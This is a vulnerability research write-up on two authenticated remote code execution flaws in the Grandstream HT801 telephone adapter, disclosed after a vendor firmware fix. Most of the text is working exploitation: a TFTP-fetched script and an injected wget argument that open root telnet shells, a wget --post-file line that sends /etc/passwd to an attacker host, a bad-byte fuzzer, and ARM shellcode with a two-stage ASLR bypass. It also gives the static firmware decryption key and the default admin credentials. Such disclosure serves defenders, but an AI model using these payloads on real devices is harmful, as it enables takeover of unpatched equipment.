This article describes the identification and exploitation of two authenticated remote code execution vulnerabilities that we found during a time-bounded security assessment of the Grandstream’s HT801 Analog Telephone Adapter. Both vulnerabilities are exploitable via the limited configuration shell which is accessible over SSH/Telnet. These and other less critical findings were addressed by Grandstream with the release of the firmware version [1.0.29.8](http://firmware.grandstream.com/BETA/Release_Note_HT80x_1.0.29.8.pdf).

[CVE-2021-37915](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37915): Authenticated Remote Code Execution via debugging functionality during the startup of the device

[CVE-2021-37748](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37748): Authenticated stack based buffer overflow in the "manage\_if" configuration parameter handling

Device details can be found [here](http://www.grandstream.com/products/gateways-and-atas/analog-telephone-adaptors/product/ht801).

### Firmware unpacking

To follow the article please get a copy of a firmware file [here](https://firmware.grandstream.com/Release_HT801_1.0.27.2.zip). The firmware blob is encrypted, however, due to the great work done by [BigNerd95](https://github.com/BigNerd95/Grandstream-Firmware-HT802) we can easily extract it. The static AES key used for encryption, is being reused across the line of devices.

We are working inside an Ubuntu 20.04.2 LTS vm:

```
$ mkdir workspace && cd workspace
$ export WS=$(pwd)

```

Download & unzip the firmware:

```
$ echo "check_certificate = off" >> ~/.wgetrc
$ wget https://firmware.grandstream.com/Release_HT801_1.0.27.2.zip
$ unzip Release_HT801_1.0.27.2.zip

```

Clone the extraction tool:

```
$ git clone https://github.com/BigNerd95/Grandstream-Firmware-HT802
$ cd Grandstream-Firmware-HT802/FirmwarePatcher/

```

Extract the firmware:

```
$ ./GSFW.py extract -i $WS/Release_HT801_1.0.27.2/ht801fw.bin -d extracted -k 37d6ae8bc920374649426438bde35493

		Body key: 000ea99a07e5031d1034fd2000010000
		Decrypting...

```

In particular, we are interested in the "ht801base.bin" and "ht801prog.bin" files. The first one contains the root file system of the underlying Linux OS and the second one contains additional software. Both files can be easily extracted using the [binwalk](https://github.com/ReFirmLabs/binwalk) tool.

### Device Administration via Limited Shell

By default, the device exposes web and ssh services for administration. Default credentials for both services are "admin:admin". Additionally, a Telnet service can be enabled via the web interface.

The "CONFIG>" submenu allows us to set device parameters which in turn are saved to the device's [nvram](https://en.wikipedia.org/wiki/Non-volatile_random-access_memory). All of the functionality is implemented in the /sbin/gs\_config binary.

```

## CVE-2021-37915

There are multiple shell scripts inside the /bin folder which are executed upon boot. One of them is the "ht\_start.sh" script. It contains the following snippet:

```
 1#
 2# Start gs_ata
 3#
 4if [ ! -z "`nvram get gdb_debug_server`" ]; then
 5    GDB_SERVER_IP=`nvram get gdb_debug_server`
 6    GDB_SERVER_PORT=9876
 7    cd /tmp/
 8    tftp -g -r gdbserver ${GDB_SERVER_IP}
 9    if [ -f ./gdbserver ]; then
10        chmod +x gdbserver
11        echo "Starting gs_ata with GDB support @ ${GDB_SERVER_IP}:${GDB_SERVER_PORT}"
12        ./gdbserver ${GDB_SERVER_IP}:${GDB_SERVER_PORT} /app/bin/gs_ata &
13    fi
14else
15    echo "Starting gs_ata..."
16    /app/bin/gs_ata &
17    echo $! > /var/run/gs_ata.pid
18fi

```

Essentially, if a "gdb\_debug\_server" value is set (4), the script tries to download a "gdbserver" file from the specified host via TFTP (8) and executes it (13). By setting the value to an IP address of a malicious TFTP server and then rebooting the device - we can gain Remote Code Execution (RCE) as root upon device boot.

On our box we have to setup a TFTP server and create a file:

```
$ cat /srv/tftp/gdbserver
telnetd -l /bin/ash -p 9999 &

```

After making sure that our TFTP server is up and running, we can proceed to activate the hidden setting on the device and reboot it:

```
$ ssh admin@192.168.1.128
Grandstream HT801 Command Shell Copyright 2006-2021
admin@192.168.1.128's password:
GS> config
CONFIG> set gdb_debug_server 192.168.1.102
gdb_debug_server = 192.168.1.102
CONFIG> commit
Changes are commited.
CONFIG> get gdb_debug_server
gdb_debug_server = 192.168.1.102
CONFIG> exit
GS> reboot
Rebooting...

```

Upon the booting process, the device will fetch and execute the "gdbserver" script hosted on our TFTP server. A root shell is then waiting on port 9999:

```
$ telnet 192.168.1.128 9999
Trying 192.168.1.128...
Connected to 192.168.1.128.
Escape character is '^]'.
# uname -nrsm
Linux HT8XX 3.4.20-rt31-dvf-v1.2.6.1-rc2 armv5tejl

```

Another similar bug lurks in the "gs\_test\_suite.sh" file:

```
 1#!/bin/sh
 2
 3CUR_DIR=`pwd`
 4TEST_DIR=gs_test
 5TEST_SCRIPT=gs_test_script.sh
 6TEST_SERVER=`nvram get gs_test_server`

 8
 9if [ ! -d /${TEST_DIR} ]; then
10        mkdir /${TEST_DIR}
11fi
12
13cd /${TEST_DIR}
14
15wget -q -t 2 -T 5 http://${TEST_SERVER}:${TEST_SERVER_PORT}/${TEST_SCRIPT}
16if [ "$?" = "0" ]; then
17    echo "Finished downloading ${TEST_SCRIPT} from http://${TEST_SERVER}:${TEST_SERVER_PORT}"
18    chmod +x ${TEST_SCRIPT}
19    echo "Starting GS Test Suite..."
20    ./${TEST_SCRIPT} http
21else
22    echo "ERROR downloading ${TEST_SCRIPT} from http://${TEST_SERVER}:${TEST_SERVER_PORT}"
23    echo "Falling back to TFTP server..."
24    tftp -g -r ${TEST_SCRIPT} ${TEST_SERVER}
25    if [ "$?" = "0" ]; then
26        echo "Finished downloading ${TEST_SCRIPT} from TFTP ${TEST_SERVER}"
27        chmod +x ${TEST_SCRIPT}
28        echo "Starting GS Test Suite..."
29        ./${TEST_SCRIPT} tftp
30    else
31        echo "Failed to download ${TEST_SCRIPT} via HTTP or TFTP check test server ip address"
32    fi
33fi
34
35cd ${CUR_DIR}

```

Here, by setting the "gs\_test\_server" parameter (6) we can inject into the "wget" command (15), which would allow us to read and write arbitrary files. The injection is as follows:

```
set gs_test_server (webserver address)(space)(injection)(space)

```

The space at the end is important. Otherwise, our command would be concatenated with the "TEST\_SERVER\_PORT" variable.

Extract any file from the OS:

```
CONFIG> set gs_test_server 192.168.1.198/ --post-file=/etc/passwd

```

Overwrite/Create any file on the OS:

```
CONFIG> set gs_test_server 192.168.1.198/xxx -e output_document=/tmp/boom

CONFIG> set gs_test_server 192.168.1.198/xxx -O /tmp/boom

```

Most of the important parts of the OS are mounted read-only. One way to achieve command execution is by overwriting the "/tmp/config/rc.conf file", which is used by several scripts upon boot.

We can obtain the original "rc.conf" file from the extracted firmware and prepend one command that will spawn the Telnet server:

```
$ head -n 5 rc.conf
telnetd -l /bin/ash -p 1337 &

export conf_sourced=1

export hostname="HT8XX"

```

The next step is to set the variable to point to our webserver and reboot the device. The injected wget flag will force-save our file.

```
CONFIG> set gs_test_server 192.168.1.198/xxx -O /tmp/config/rc.conf
CONFIG> commit
CONFIG> reboot

```

After reboot, the root shell is available on port 1337:

```
$ telnet 192.168.1.128 1337
Trying 192.168.1.128...
Connected to 192.168.1.128.

```

## CVE-2021-37748

A stack-based overflow affecting the handling of the "manage\_if" config parameter allows an authenticated attacker to break out of the limited configuration interface and get a root shell on the device.

### Analysis

We started with the static analysis of the gs\_config binary, which implements the limited configuration shell. It provides an authenticated user with a quick text-based interface available over SSH (and optionally Telnet). For fun, we will communicate with the device over Telnet.

When it comes to the IOT world, the probability of finding old-school bugs is always an option. We hunted for the obvious candidates, such as strcpy() - and indeed, we identified multiple instances. The most promising one turned out to be at 0xB3A4:

![grandstream-strcpy.png](/media/images/grandstream-strcpy.width-800.png)

When a user types the "status" command from the initial menu - among other things a value for the "Management Interface" called "manage\_if" is retrieved from nvram via the "nvram\_get" function and is placed into a local buffer via strcpy(). The interface value is later used for resolving and displaying the "Management IPv4 Address". By placing a large string via the "set manage\_if VALUE" command and executing a "status" command we can overflow the stack buffer and overwrite important values on the stack, i.e. the saved return address of the local function, thereby taking control of the execution flow.

### Control over PC

The pointer to the buffer returned by "nvram\_get" at 0xB394 (value of the "manage\_if" setting pulled from the nvram) will be stored in the R0 register. Then, the address from R0 is being copied into the R1 register - this is the second argument for strcpy() - our controlled data (src). The R0 register is then being set to a local buffer stored on the stack (dest):

```
0xb394    bl     #nvram_get@plt <nvram_get@plt>

   0xb398    mov    r1, r0
   0xb39c    add    r0, sp, #0x7b0
   0xb3a0    add    r0, r0, #0xc
 ► 0xb3a4    bl     #strcpy@plt <strcpy@plt>
        dest: 0xcee69bf4 ◂— 9 /* '\t' */           # stack
        src: 0xc6d3b0a9                            # nvram

```

The strcpy() function does not perform bounds checking, therefore, we are able to overflow with the "trusted" data returned from the nvram.

Further down the path, another interesting thing happens. The prologue of the 0x984C sub-routine will push the LR (0xB3C0) to the stack. The stack address pointing to the beginning of our payload is being passed (among others) as the argument for the 0x984C sub-routine:

![grandstream-984c.png](/media/images/grandstream-984c.width-800.png)

The 0x984C sub-routine:

![984c-disasm.png](/media/images/984c-disasm.width-800.png)

The R7 register holds the pointer to our data (source), and the current stack pointer is being used as the destination for the strcpy() function at 0x9880, thus overflowing the stack. When the ioctl() system call at 0x9890 fails, the branch to the close() function at 0x98E0 is done, and the sub-routine will attempt to return:

![call-graph.png](/media/images/call-graph.width-800.png)

Next, the sub-routine is going to its epilogue at 0x9938:

![epilogue.png](/media/images/epilogue.width-800.png)

It restores the values from the overflowed stack, thus, popping our data into the respective registers:

### Exploit development

By abusing the aforementioned CVE-2021-37915 we can get root shell access to the device and set up a remote debugging environment for dynamic analysis and exploit development purposes. This approach will simplify the process, as we don't need to handle often complicated emulation dependencies and we can work on the actual hardware.

The following payload overwrites registers R4-R7 with AAAA's and the PC (program counter) with BBBB's:

```
$ python -c 'print(b"set manage_if " + b"A"*52+b"BBBB")'
b'set manage_if AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB'

```

Steps to reproduce the crash from within the configuration shell:

```
GS> config
CONFIG> set manage_if AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
manage_if = AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
CONFIG> commit
Changes are commited.
CONFIG> exit
GS> status
Product Model: HT801

### Long live Return-to-Zero-Protection

What is interesting is ASLR on the device is configured as follows:

```
# cat /proc/sys/kernel/randomize_va_space
1

```

From the Kernel [documentation](https://www.kernel.org/doc/Documentation/sysctl/kernel.txt) we can read that:

```
0 - Turn the process address space randomization off. This is the default for architectures that do not support this feature anyways, and kernels that are booted with the "norandmaps" parameter.

1 - Make the addresses of mmap base, stack and VDSO page randomized. This, among other things, implies that shared libraries will be loaded to random addresses.  Also for PIE-linked binaries, the location of code start is randomized. This is the default if the CONFIG_COMPAT_BRK option is enabled.

2 - Additionally enable heap randomization. This is the default if CONFIG_COMPAT_BRK is disabled.

```

We can confirm how it affects randomization on the device:

```
# for i in `seq 1 5`; do ldd /bin/ls | grep /libc.so; done
        libc.so.0 => /lib/libc.so.0 (0xc6e7c000)
        libc.so.0 => /lib/libc.so.0 (0xc6f10000)
        libc.so.0 => /lib/libc.so.0 (0xc6f45000)
        libc.so.0 => /lib/libc.so.0 (0xc6f3d000)
        libc.so.0 => /lib/libc.so.0 (0xc6ea9000)

# for i in `seq 1 5`; do grep heap /proc/self/maps; done
0007a000-0007b000 rwxp 00000000 00:00 0          [heap]
0007a000-0007b000 rwxp 00000000 00:00 0          [heap]
0007a000-0007b000 rwxp 00000000 00:00 0          [heap]
0007a000-0007b000 rwxp 00000000 00:00 0          [heap]
0007a000-0007b000 rwxp 00000000 00:00 0          [heap]

```

Shared libraries are correctly loaded at random addresses, however, the heap is at a static address. We can confirm this by enforcing heap randomization:

```
# echo 2 > /proc/sys/kernel/randomize_va_space
# for i in `seq 1 5`; do grep heap /proc/self/maps; done
00d82000-00d83000 rwxp 00000000 00:00 0          [heap]
000e4000-000e5000 rwxp 00000000 00:00 0          [heap]
0079f000-007a0000 rwxp 00000000 00:00 0          [heap]
01fd0000-01fd1000 rwxp 00000000 00:00 0          [heap]
00a18000-00a19000 rwxp 00000000 00:00 0          [heap]

```

Knowing that the heap is not randomized, we have been looking for a way to utilize it for our purposes. The obvious choice is to look for the cross-references to the malloc() function, which lead to a set of imported functions from the libnvram.so shared library. The most interesting ones are nvram\_get,nvram\_set and nvram\_commit. They're responsible for the device's nvram read/write operations.

```
$ readelf -ds gs_config | grep nvram
 0x00000001 (NEEDED)                     Shared library: [libnvram.so]
    10: 00009080     0 FUNC    GLOBAL DEFAULT  UND nvram_erase_all
    19: 00009194     0 FUNC    GLOBAL DEFAULT  UND nvram_commit_sync
    37: 0000917c     0 FUNC    GLOBAL DEFAULT  UND nvram_commit
    44: 000093b0     0 FUNC    GLOBAL DEFAULT  UND nvram_get
    47: 000090d4     0 FUNC    GLOBAL DEFAULT  UND nvram_set
    54: 000092c0     0 FUNC    GLOBAL DEFAULT  UND nvram_erase_not_list
    59: 00009158     0 FUNC    GLOBAL DEFAULT  UND nvram_check_password
    60: 000091f4     0 FUNC    GLOBAL DEFAULT  UND nvram_erase_list
    75: 00009218     0 FUNC    GLOBAL DEFAULT  UND nvram_unset

```

During the analysis of the libnvram.so shared library, we've noticed that if the length of the configuration setting plus its value is larger than 100 bytes (hex 0x64), the nvram\_set wrapper is going to call malloc(), and thus will request the memory from the heap.

![malloc.png](/media/images/malloc.width-800.png)

The following configuration shell command will force the program to allocate our controlled data at the static address on the heap:

```
CONFIG> set manage_if AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

```

Let's confirm in GDB:

```
gef➤  search-pattern "AAAAAAAAAAAAAAAAAA"
[+] Searching 'AAAAAAAAAAAAAAAAAA' in memory
[+] In '[heap]'(0x16000-0x17000), permission=rwx
  0x16012 - 0x16049  →   "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
  0x16024 - 0x1605b  →   "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
  0x16036 - 0x1606d  →   "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
  0x16048 - 0x1606d  →   "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
  0x1605a - 0x1606d  →   "AAAAAAAAAAAAAAAAAAA"

```

We can defeat ASLR by storing our payload in the known, static **rwx** heap location, then overflow and redirect the program flow to it. This basically renders it as the **Return-to-Zero-Protection** scenario.

### Size and Bad Bytes Limitations

When trying to exploit a buffer overflow vulnerability it is important to identify the limitations of the shellcode that we can use. These are the questions that we need to answer before a reliable exploit can be created:

* What is the size limitation of the shellcode?
* What are the bad bytes?

By sending a sizeable payload, we can observe how many bytes arrive and are placed on the heap. This should tell us the maximum size of the consecutive bytes that we are working with.

Trying all possible bytes (0-255), one by one, allows us to deduce the bad ones that we should avoid in our final payload:

```
 1from pwn import *
 2
 3context.timeout=2
 4context.log_level = 'error'
 5
 6IP='192.168.1.128'
 7PASS='admin'
 8
 9avoid = []
10
11def login():
12    p = remote(IP,23)
13    p.sendlineafter('Password: ',PASS)
14    p.sendlineafter('GS> ','config')
15    return p
16
17def fuzz(byte):
18    p = login()
19    try:
20     p.sendlineafter('CONFIG> ',b'set manage_if A-'+byte+b'-B')
21     p.sendlineafter('CONFIG> ',b'get manage_if')
22     p.recv()
23     if not b'A-'+byte+b'-B' in p.recv() or not p.recv():
24         #print("Bad: ",repr(byte))
25         avoid.append(byte)
26    except:
27     pass
28    p.close()
29
30x=make_packer('all')
31for i in range(0,256):
32    fuzz(x(i))
33
34print(avoid)

```

Bytes that cannot be stored in the "manage\_if" setting:

```
$ python ht-fuzz.py
[b'\x00', b'\x04', b'\t', b'\n', b'\r', b'\x11', b'\x12', b'\x13', b'\x15', b'\x16', b'\x17', b'\x1a', b'\x1c', b'\x7f', b'\xca', b'\xff']

```

The limitation of the 0xFF byte is important, because it does not allow us to easily switch to Thumb mode via BX/BLX instructions, as those instructions will always contain the 0xFF byte in the opcode:

```
>>> from pwn import *
>>> context.arch='arm'
>>> asm('bx r4;')
b'\x14\xff/\xe1'
>>> asm('blx r4;')
b'4\xff/\xe1'

```

Our exploit is communicating with the device via the Telnet protocol. What is interesting and can be easily overlooked, is the fact that the 0xFF byte (255 decimal) is the IAC (Interpret As Command) byte which signals that the next byte is a Telnet command. Therefore, a 0xFF byte in our shellcode will not be interpreted as data but, along with the following byte, will be interpreted as a Telnet command. If we look at the [RFC](https://datatracker.ietf.org/doc/html/rfc854) for the Telnet protocol, we can find a simple solution to this problem:

*All TELNET commands consist of at least a two byte sequence: the "Interpret as Command" (IAC) escape character followed by the code for the command. The commands dealing with option negotiation are three byte sequences, the third byte being the code for the option referenced. This format was chosen so that as more comprehensive use of the "data space" is made -- by negotiations from the basic NVT, of course -- collisions of data bytes with reserved command values will be minimized, all such collisions requiring the inconvenience, and inefficiency, of "escaping" the data bytes into the stream.* ***With the current set-up, only the IAC need be doubled to be sent as data, and the other 255 codes may be passed transparently****.*

To successfully sneak the 0xFF byte as data we have to double it:

```
>>> asm('bx r4').replace(b'\xff',b'\xff\xff')
b'\x14\xff\xff/\xe1'

```

### First exploitation path

The ARM processor can execute in 32-bit and 16-bit modes named ARM and Thumb respectively. To reduce the size and avoid NULL bytes, most of the shellcodes switch to 2-byte Thumb mode.

Knowing the available space on the heap and the subset of bad bytes, we can craft new or adjust existing shellcode for our target CPU.

[Here](http://shell-storm.org/shellcode/files/shellcode-665.php) is the 30-bytes long ARM rev5 shellcode that we can tailor for our purposes:

```
8054:   e28f3001    add r3, pc, #1  ; 0x1
8058:   e12fff13    bx  r3
805c:   4678        mov r0, pc
805e:   300a        adds    r0, #10
8060:   9001        str r0, [sp, #4]
8062:   a901        add r1, sp, #4
8064:   1a92        subs    r2, r2, r2
8066:   270b        movs    r7, #11
8068:   df01        svc 1
806a:   2f2f        cmp r7, #47
806c:   6962        ldr r2, [r4, #20]
806e:   2f6e        cmp r7, #110
8070:   6873        ldr r3, [r6, #4]

```

The above shellcode produces a set of bad bytes. We can fix that by swapping the unwanted instructions as follows:

```
>>> from pwn import *
>>> context.arch='arm'

# original instruction from the shellcode
>>> asm('add r3,pc,#1').hex()
'01308fe2'
# we use r4 to avoid bad byte on the following branch instruction
>>> asm('add r4,pc,#1').hex()
'01408fe2'
# branch instruction producing bad byte: 0x13
>>> asm('bx r3').hex()
'13ff2fe1'
# we use the r4 register instead and we double patch the Telnet's IAC 0xff byte
>>> asm('bx r4').replace(b'\xff',b'\xff\xff').hex()
'14ffff2fe1'

# switch CPU context
>>> context.arch='thumb'
# decimal 10 will produce the bad byte: 0x0a
>>> asm('adds r0, #10').hex()
'0a30'
# we can securely change it to 0x0b
>>> asm('adds r0, #11').hex()
'0b30'
# subs instruction producing bad byte: 0x1a
>>> asm('subs r2, r2, r2').hex()
'921a'
# we swap it to the XOR instrution
>>> asm('eors r2, r2, r2').hex()
'5240'

```

After the adjustments, we can produce a small, bad-byte safe shellcode that will spawn a shell on our target device over Telnet:

```
# ARM926EJ-S rev 5 (v5l)
# execve("/bin/sh","/bin/sh",0)
sc = b''
sc += asm('add r4,pc,#1')
# Double byte patch (Telnet 0xff IAC byte patch), switch to Thumb
sc += asm('bx r4').replace(b'\xff',b'\xff\xff')

# Switch CPU context
context.arch='thumb'

sc += asm("""
mov r0, pc;
adds r0,#11;
str r0,[sp,#4];
add r1,sp,#4;
eors r2,r2,r2;
movs r7,#11;
svc 1;
cmp r7,#47;
ldr r2,[r4,#20];
cmp r7,#110;
ldr r3,[r6,#4]
""")

```

In the first payload we are going to request more than 100 bytes and place our shellcode in the known, static address on the heap. We are not going to trigger the vulnerablity yet, we're just abusing the functionality to store our data.

```
payload = b'A'*134 + sc

```

We can verify that our shellcode is indeed intact and at the static address on the heap:

```
gef➤  x/2i 0x16098
   0x16098:	add	r4, pc, #1
   0x1609c:	bx	r4

```

The rest of the opcodes starts at 0x160a0, however, we are dealing with 2-byte aligned Thumb instructions, hence +1 is added to the address:

```
gef➤  x/11i 0x160a1
   0x160a1:	mov	r0, pc
   0x160a3:	adds	r0, #11
   0x160a5:	str	r0, [sp, #4]
   0x160a7:	add	r1, sp, #4
   0x160a9:	eors	r2, r2
   0x160ab:	movs	r7, #11
   0x160ad:	svc	1
   0x160af:	cmp	r7, #47	; 0x2f
   0x160b1:	ldr	r2, [r4, #20]
   0x160b3:	cmp	r7, #110	; 0x6e
   0x160b5:	ldr	r3, [r6, #4]

```

The second payload will be shorter and will overwrite the return value on the stack with the precise address of our stored payload. To trigger the vulnerability we will exit the config sub-routine and run the "status" command from the main menu, as described in the previous sections. The program flow continues and hits our shellcode, which spawns the root shell.

### Another exploitation strategy

Rather than trying to exploit the program in one shot by using the execve shellcode on the rwx heap, we can also use a strategy that is quite common in Capture The Flag (CTF) exploitation challenges. If the binary runs in an ASLR enabled environment, then this two-step process can be used whenever possible:

* **Stage1 shellcode** - Leak the address of the puts() function, for example, from memory; based on that, calculate the addresses of the system() function and of the "/bin/sh\0" string
* **Stage2 shellcode** - Utilise information from the leak and call system('/bin/sh\0')

### A way to move arbitrary values to registers

When trying to call any function in ARM architecture the arguments are passed in the registers R0, R1, R2, and R3. If there's a function that takes more than 4 arguments then the stack is utilized starting with the 5th argument. So, in the most common cases of exploit development on the Linux OS we will be utilizing single argument functions such as puts() and system() and we will need to load an arbitrary address into R0.

Even though the registers on 32bit ARM architecture are 4 bytes, the MOV instruction for immediate values has a limitation:

```
MOV{cond} Rd, #imm16

imm16 is any value in the range 0-65535.

```

Also, using the R0 register will produce 0x00 (a bad byte) in the opcode:

```
>>> from pwn import *
>>> context.arch = 'arm'
>>> asm('mov r0, 1')
b'\x01\x00\xa0\xe3'

```

We can avoid that by utilizing a different register such as R6 and finding a way to move the result back to R0 afterwards:

```
>>> asm('mov r6, 1')
b'\x01`\xa0\xe3'

```

We can load arbitrary 4 byte values into R6 byte-by-byte and shift the result to the left by 8 bits as such:

```
mov r6, #0x1            ; R6 == 0x00000001
mov r6, r6, LSL #8      ; R6 == 0x00000100
add R6, R6, #0x58       ; R6 == 0x00000158
mov r6, r6, LSL #8      ; R6 == 0x00015800
add R6, R6, #0x9c       ; R6 == 0x0001589c

```

In this example we have loaded R6 with the address of puts@GOT, which is 0x1589c:

```
>>> e = ELF("./gs_config",checksec=False)
>>> hex(e.got.puts)
'0x1589c'

```

The most obvious way of moving the R6 value to R0 has the dreaded 0x00 byte:

```
>>> asm('mov r0, r6')
b'\x06\x00\xa0\xe1'

```

We can try adding a benign shift/rotate operation to change the opcodes, however, using a "0" constant changes nothing:

```
>>> asm('mov r0, r6, ror 0')
b'\x06\x00\xa0\xe1'

```

Fortunately, at the time of the crash we have several registers with value 0 already in them. One such register is R8, which allows us to avoid bad bytes:

```
>>> asm('mov r0, r6, ROR r8')
b'v\x08\xa0\xe1'

```

So, connecting all the instructions above we have a way of moving arbitrary values into the R0 register while avoiding bad bytes.

This piece of assembly will load 0x1589c (puts@GOT address) into R0:

```
; assuming r8==0
mov r6, #0x1            ; R6 == 0x00000001
mov r6, r6, LSL #8      ; R6 == 0x00000100
add R6, R6, #0x58       ; R6 == 0x00000158
mov r6, r6, LSL #8      ; R6 == 0x00015800
add R6, R6, #0x9c       ; R6 == 0x0001589c
mov r0, r6, ROR r8      ; R0 == 0x0001589c

```

For future reference, let's call it "load\_puts\_got":

```
load_puts_got = asm("""
mov r6, #0x1;
mov r6, r6, lsl #8;
add r6, r6, #0x58;
mov r6, r6, lsl #8;
add r6, r6, #0x9c;
mov r0, r6, ror r8
""")

```

### Stage 1

Stage 1 is responsible for leaking the address of a function of our choice. Having the leak we can calculate the base address in which the uClibc shared library was loaded during the runtime.

The target binary is dynamically linked and was not compiled as a Position Independent Executable (PIE), therefore, it will not randomize its instruction addresses nor memory maps upon each execution. The base address of the loaded ELF will be at 0x8000:

```
$ file /tmp/gs_config
/tmp/gs_config: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked,
interpreter /lib/ld-uClibc.so.0, stripped

$ pwn checksec /tmp/gs_config
[*] '/tmp/gs_config'
    Arch:     arm-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8000)

```

Since our target binary is not PIE, the address of the puts() function in The Procedure Linkage Table (PLT) is known and static. The Procedure Linkage Table holds an entry for each external function reference. As an argument to the function, we will use the GOT address of puts() itself. The Global Offset Table (GOT) is a large table of function pointers to the actual memory location of external functions. Basically - jumping to the PLT entry for the function equals calling the function.

In short - we will call puts@plt(puts@got) to leak the current address of the uClibc's puts() from memory.

A good candidate, which allows us to continue execution without a crash after the leak, is inside the "CONFIG>" sub-routine and is located at the 0xA348 address. Straight after it, we have a branch instruction that goes back towards the start of the sub-routine. There's a small issue that we need to fix before the execution can continue after that branch instruction. Due to the overflow, we are overwriting certain registers which are used by the program to function properly.

As we can see, before the address of the branch instruction we have a function prologue:

```
.text:00009AC4    PUSH    {R4-R11,LR}
.text:00009AC8    LDR     R4, =stdout
.text:00009ACC    SUB     SP, SP, #0x254
.text:00009AD0    LDR     R11, =stdin
.text:00009AD4    LDR     R7, =__ctype_b
.text:00009AD8    ADD     R5, SP, #0x278+var_5C
.text:00009ADC    ADD     R1, R5, #4
.text:00009AE0    ADD     R6, SP, #0x278+var_30
.text:00009AE4    STR     R1, [SP,#0x278+var_264]

```

We can see that registers R4, R7 and R11 hold the stdout, \_\_ctype\_b, and stdin values which are important for further execution. Therefore, in order to continue the execution flow after the leak, we need to restore those values.

### Important register fix

The aforementioned stdout, \_\_ctype\_b, and stdin values are stored at fixed addresses in the .bss segment which contains statically allocated variables that are declared but have not been assigned a value yet:

```
.bss:0001592C ; Segment type: Uninitialized
.bss:0001592C                 AREA .bss, DATA
.bss:0001592C                 ; ORG 0x1592C
.bss:0001592C                 EXPORT stdout
.bss:0001592C stdout          % 4                  ; DATA XREF: LOAD:000084D8↑o
.bss:0001592C                                      ; LOAD:00008748↑o ...
.bss:0001592C                                      ; Copy of shared data
.bss:00015930                 EXPORT __ctype_b
.bss:00015930 __ctype_b       % 4                  ; DATA XREF: LOAD:00008708↑o
.bss:00015930                                      ; sub_9AC4+10↑o ...
.bss:00015930                                      ; Copy of shared data
.bss:00015934                 EXPORT stdin
.bss:00015934 stdin           % 4                  ; DATA XREF: LOAD:000084C8↑o
.bss:00015934                                      ; sub_9AC4+C↑o ...
.bss:00015934                                      ; Copy of shared data

```

At the moment of the overflow, the R10 register holds a value which is quite close to the ones we need loaded:

```
pwndbg> i r
r0             0x0                 0
r1             0x8915              35093
r2             0xffffffff          4294967295
r3             0x10                16
r4             0x42424242          1111638594
r5             0x42424242          1111638594
r6             0x42424242          1111638594
r7             0x42424242          1111638594
r8             0x0                 0
r9             0x0                 0
r10            0x16170             90480
r11            0x0                 0
r12            0xffffffff          4294967295
sp             0xcecdd428          0xcecdd428
lr             0x98e8              39144
pc             0x42424240          0x42424240
cpsr           0x10                16

```

We can use R10 to do some simple math and load correct values into R4, R7 and R11. The following snippet will "fix" the registers (all the while avoiding the bad bytes):

```
sub r4, r10, #2000         ; r4 = 0x16170 - 2000 = 0x159a0
sub r11, r4, #108          ; r11 = 0x159a0 - 108 = 0x15934 => stdin
sub r7, r4, #112           ; r7 = 0x159a0 - 112 = 0x15930 => __ctype_b
sub r4, r4, #116           ; r4 = 0x159a0 - 116 = 0x1592c => stdout

```

We will call it "fix\_regs":

```
fix_regs = asm("""
sub r4,r10, #2000;
sub r11, r4, #108;
sub r7, r4, #112;
""")

```

What is left to do, is to jump to the PLT address of the puts() function, let's call it "jmp\_puts". We combine all of the above as a **Stage1** shellcode:

```
fix_regs = asm("""
sub r4,r10, #2000;
sub r11, r4, #108;
sub r7, r4, #112;
""")
load_puts_got = asm("""
mov r6, #0x1;
mov r6, r6, lsl #8;
add r6, r6, #0x58;
mov r6, r6, lsl #8;
add r6, r6, #0x9c;
mov r0, r6, ror r8
""")
jmp_puts = asm("""
mov r6, #0xA3;
mov r6, r6, lsl #8;
add r6, r6, #0x48;
mov r1, r8;
mov pc, r6;
""")

```

### Stage 2

The plan is to craft a shellcode that will load the "/bin/sh\0" string into the R0 register and call system(). Having defeated ASLR with **Stage1** shellcode, we can easily calculate the required addresses. The aforementioned problem of bad bytes complicates it a bit. We cannot directly put a value into the R0 register.

The NULL terminated "/bin/sh" string is located at the 0x60eb0 offset in the uClibc and the system() function is 0x5e54c away from the uClibc base address:

```
>>> from pwn import *
>>> context.arch='arm'
>>> libc = ELF("libuClibc-0.9.33.1-git.so",checksec=False)
>>> hex(next(libc.search(b'/bin/sh\0')))
'0x60eb0'
>>> hex(libc.sym.system)
'0x5e54c'

```

Other way around to quickly figure out the offsets:

```
$ strings -tx libuClibc-0.9.33.1-git.so | grep /bin/sh
  60eb0 /bin/sh

$ readelf -s libuClibc-0.9.33.1-git.so | grep __libc_system
   855: 0005e54c   108 FUNC    GLOBAL DEFAULT    7 __libc_system

```

To safely sneak the calculated "/bin/sh" address stored in R6 into the R0 register, we will use the aforementioned technique and perform a right bit-shift using NULL in the R2 register. This is not going to change the value of the R6 or R0 registers, but the instruction will provide bad-byte-safe opcode:

```
; assuming r2 == 0
mov r0, r6, ror r2;

```

Having the leak, we can automate the **Stage2** shellcode generation with the following snippets:

```
# offset = leak - libc_base
libc_base = leak - 0x32654
system = libc_base + 0x5e54c
binsh = libc_base + 0x60eb0

q,w,e,r = unpack('4B',pack('>I',binsh))
load_binsh = asm("""
mov r6, #%d;
mov r6, r6, lsl #8;
add r6, r6, #%d;
mov r6, r6, lsl #8;
add r6, r6, #%d;
mov r6, r6, lsl #8;
add r6, r6, #%d;
mov r0, r6, ror r2;
""" % (q,w,e,r))

